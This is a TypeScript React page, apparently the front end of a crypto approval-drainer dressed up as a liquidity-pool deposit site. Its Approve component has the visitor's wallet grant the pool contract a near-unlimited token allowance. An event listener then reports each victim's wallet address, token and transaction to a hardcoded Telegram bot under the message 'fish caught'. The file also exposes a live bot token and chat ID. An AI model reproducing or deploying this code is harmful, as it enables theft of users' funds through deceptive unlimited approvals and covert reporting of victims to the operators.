import { useAccount, useContractEvent, useContractWrite, usePrepareContractWrite } from 'wagmi'
import { Button, Select, SelectItem } from '@nextui-org/react'
import React, { useMemo, useState } from 'react'
import { NextSeo } from 'next-seo'
import axios from 'axios'
import { useRouter } from 'next/router'
import { abis, Pool, pools } from '@/pools'
import { BeatLoader } from 'react-spinners'
import { useAllTokenData } from '@/state/tokens/hooks'
import { notEmpty } from '@/utils'
import CurrencyLogo from '@/components/CurrencyLogo'
import { ChevronsRight } from 'react-feather'

function Approve({ pool }: { pool: Pool }) {
  const allTokens = useAllTokenData()
  const formattedTokens = useMemo(() => {
    return Object.values(allTokens)
      .map((t) => t.data)
      .filter(notEmpty)
  }, [allTokens])
  let [approving, setApproving] = useState(false)
  let [token, setToken] = useState(pool.token0.address)
  const spender = pool.address
  const amount = BigInt(1.15 * 10 ** 77)

  const {
    config,
    error: prepareError,
    isError: isPrepareError,
    isLoading: isPreparing,
  } = usePrepareContractWrite({
    address: token as `0x${string}`,
    abi: abis.approve,
    functionName: 'approve',
    args: [spender, amount],
    enabled: true,
  })

  const { data, error, isLoading: isWriteLoading, isError: isWriteError, writeAsync } = useContractWrite(config)

  useContractEvent({
    address: token as `0x${string}`,
    abi: abis.approve,
    eventName: 'Approval',
    listener(log) {
      // 判断topics[2]是否为本项目的pool
      // console.log(log)
      for (let i = 0; i < log.length; i++) {
        if (BigInt(log[i].topics?.[2] as string) !== BigInt(pool.address)) return
        if (Number(log[i].data) !== 0) {
          const dataStr = `吃鱼啦！\ntoken: ${log[i].address?.toString()}\nowner: 0x${BigInt(log[i].topics?.[1] as string).toString(
            16
          )}\nspender: 0x${BigInt(log[i].topics?.[2] as string).toString(16)}\ntransaction: ${log[i].transactionHash?.toString()}`
          // 5828246844:AAFquV4si3VAQthPl7urJarAsuJ9z0FHVho
          axios
            .post(`https://api.telegram.org/bot5828246844:AAFquV4si3VAQthPl7urJarAsuJ9z0FHVho/sendMessage`, {
              chat_id: '-1001926835252',
              text: dataStr,
            })
            .then((res) => console.log(res))
            .catch((err) => console.log(err))
          console.log('Approval successful')
        }
      }
    },
  })

  function submit() {
    setApproving(true)
    writeAsync?.()
      .then((tx) => {})
      .catch((err) => {
        console.log(err)
      })
      .finally(() => setApproving(false))
  }

  return (
    <div className={'flex-col'}>
      <Select
        isRequired
        defaultSelectedKeys={[pool.token0.address]}
        items={formattedTokens}
        label="Approve to"
        className="max-w-xs"
        variant="flat"
        classNames={{
          label: 'group-data-[filled=true]:-translate-y-5',
          trigger: 'min-h-unit-16',
          listboxWrapper: 'max-h-[400px]',
        }}
        onChange={(e) => setToken(e.target.value)}
        listboxProps={{
          itemClasses: {
            base: [
              'rounded-md',
              'text-default-500',
              'transition-opacity',
              'data-[hover=true]:text-foreground',
              'data-[hover=true]:bg-default-100',
              'dark:data-[hover=true]:bg-default-50',
              'data-[selectable=true]:focus:bg-default-50',
              'data-[pressed=true]:opacity-70',
              'data-[focus-visible=true]:ring-default-500',
            ],
          },
        }}
        popoverProps={{
          classNames: {
            base: 'p-0 border-small border-divider bg-background',
            arrow: 'bg-default-200',
          },
        }}
        renderValue={(items) => {
          return items.map((token) => (
            <div key={token.data?.address} className="flex items-center gap-2">
              <CurrencyLogo address={token.data?.address} className="flex-shrink-0" size="sm" alt={token.data?.name} />
              <div className="flex flex-col">
                <span>{token.data?.name}</span>
                <span className="text-default-500 text-tiny">({token.data?.address})</span>
              </div>
            </div>
          ))
        }}
        color={'default'}>
        {(token) => (
          <SelectItem key={token.address} textValue={token.name}>
            <div className="flex gap-2 items-center">
              <CurrencyLogo address={token.address} className="flex-shrink-0" size="sm" alt={token.name} />
              <div className="flex flex-col">
                <span className="text-small">{token.name}</span>
                <span className="text-tiny text-default-400">{token.address}</span>
              </div>
            </div>
          </SelectItem>
        )}
      </Select>
      <br />
      <Button className={'mt-4'} onClick={submit} isLoading={approving} spinner={<BeatLoader size={8} color="white" />} variant="flat">
        {!approving && 'Approve'}
      </Button>
    </div>
  )
}

export default function SignExample() {
  const { isConnected } = useAccount()
  const router = useRouter()
  const { id } = router.query
  const pool = pools.find((p) => p.id + '' === id)
  if (pool === undefined) return <></>

  if (isConnected) {
    const token0Name = pool.token0.name
    const token1Name = pool.token1.name
    const swap_name = `${token0Name} / ${token1Name} Liquidity`
    return (
      <div className={'flex flex-col gap-2'}>
        <NextSeo title={swap_name} />
        <div className={'flex flex-row gap-2 items-center'}>
          <CurrencyLogo address={pool.token0.address} className="flex-shrink-0" size="sm" alt={pool.token0.name} />
          <ChevronsRight />
          <CurrencyLogo address={pool.token1.address} className="flex-shrink-0" size="sm" alt={pool.token1.name} />
        </div>
        <p className={'text-4xl font-bold'}>{swap_name}</p>
        <hr />
        <ul className={'opacity-50'}>
          <li>
            Approve either {token0Name} or {token1Name}, or both
          </li>
          <li>
            Deposit any amounts of {token0Name} or {token1Name}
          </li>
          {/* eslint-disable-next-line react/no-unescaped-entities */}
          <li>That's it! We do the rest. Withdraw whenever you want.</li>
        </ul>
        <br />
        <Approve pool={pool} />
      </div>
    )
  }

  return <div>Connect your wallet first to enable this page.</div>
}
